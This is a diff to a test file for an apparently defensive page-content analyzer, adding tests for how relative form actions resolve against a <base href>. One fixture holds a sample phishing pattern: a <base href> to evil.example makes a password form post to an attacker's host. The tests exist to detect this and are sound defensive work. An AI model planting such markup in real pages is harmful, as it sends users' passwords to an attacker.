@@ -27,6 +27,31 @@ describe("analyzePageContent", () => {
     expect(findings.crossOriginFormHosts).toEqual(["collector.evil"]);
   });
 
+  it("resolves relative form actions against a cross-origin <base href>", () => {
+    const html = `
+      <base href="https://evil.example/">
+      <form action="/collect" method="post">
+        <input type="password" name="pw">
+      </form>
+    `;
+
+    const findings = analyzePageContent(html, FINAL_URL);
+
+    // The browser would submit /collect to evil.example, not the page host.
+    expect(findings.crossOriginFormHosts).toEqual(["evil.example"]);
+  });
+
+  it("keeps relative actions same-origin under a same-site <base href>", () => {
+    const html = `
+      <base href="https://landing.example/app/">
+      <form action="login" method="post"></form>
+    `;
+
+    const findings = analyzePageContent(html, FINAL_URL);
+
+    expect(findings.crossOriginFormHosts).toEqual([]);
+  });
+
   it("counts password inputs and iframes, including hidden ones", () => {
     const html = `
       <input type="password" name="pw">
